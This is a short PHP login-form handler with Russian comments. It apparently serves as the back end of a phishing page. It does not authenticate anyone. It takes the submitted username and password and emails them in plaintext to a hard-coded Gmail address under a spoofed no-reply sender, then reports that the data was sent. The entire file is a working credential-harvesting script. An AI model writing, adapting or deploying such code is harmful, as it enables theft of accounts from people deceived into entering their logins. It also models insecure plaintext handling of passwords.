<?php
// Проверка, был ли запрос методом POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Получаем данные из формы
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Настройки отправки письма
    $to = "haymanchikl1@gmail.com"; // Ваш email
    $subject = "Данные формы логина";
    $message = "Username: $username\nPassword: $password";
    $headers = "From: no-reply@yourdomain.com\r\n" .
               "Reply-To: no-reply@yourdomain.com\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Отправка письма
    if (mail($to, $subject, $message, $headers)) {
        echo "Данные успешно отправлены!";
    } else {
        echo "Ошибка при отправке данных.";
    }
}
?>
